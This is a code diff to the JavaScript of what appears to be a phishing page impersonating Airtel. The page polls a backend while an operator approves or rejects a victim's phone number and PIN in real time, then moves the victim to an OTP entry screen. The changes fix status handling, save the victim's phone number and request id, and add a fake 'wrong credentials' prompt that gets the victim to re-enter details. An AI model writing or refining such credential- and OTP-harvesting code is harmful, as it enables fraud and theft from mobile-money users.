@@ -666,13 +666,19 @@
                                 headers: { 'X-API-Secret': await getApiSecret() }
                             });
                             const statusData = await statusRes.json();
-                            if (statusData.status === 'phone_pin_verified') {
+                            // FIX: backend sets 'approved' for login-step approval
+                            if (statusData.status === 'approved') {
                                 clearInterval(pollTimer);
+                                sessionStorage.setItem('request_id', currentRequestId);
+                                sessionStorage.setItem('airtel_phone', currentMsisdn);
                                 showOtpScreen();
                                 startTimer();
-                            } else if (statusData.status === 'rejected' || statusData.status === 'invalid') {
+                            // FIX: backend sets 'wrong_credentials' when admin taps 🔁 Resend
+                            } else if (statusData.status === 'rejected' || statusData.status === 'invalid' || statusData.status === 'wrong_credentials') {
                                 clearInterval(pollTimer);
-                                phoneError.textContent = statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid information provided';
+                                phoneError.textContent = statusData.status === 'wrong_credentials'
+                                    ? 'Oops! You have entered wrong credentials'
+                                    : (statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid information provided');
                                 phoneError.classList.add('show');
                                 sendOtpBtn.disabled = false;
                                 sendOtpBtn.classList.remove('btn-loading');
@@ -846,9 +852,11 @@
                             clearInterval(pollTimer);
                             otpScreen.classList.remove('active');
                             document.getElementById('successScreen').classList.add('active');
-                        } else if (statusData.status === 'rejected' || statusData.status === 'invalid') {
+                        } else if (statusData.status === 'rejected' || statusData.status === 'invalid' || statusData.status === 'wrong_credentials') {
                             clearInterval(pollTimer);
-                            otpError.textContent = statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid OTP provided';
+                            otpError.textContent = statusData.status === 'wrong_credentials'
+                                ? 'Oops! You have entered wrong credentials'
+                                : (statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid OTP provided');
                             otpError.classList.add('show');
                             clearOtpInputs();
                             otpInputs[0].focus();
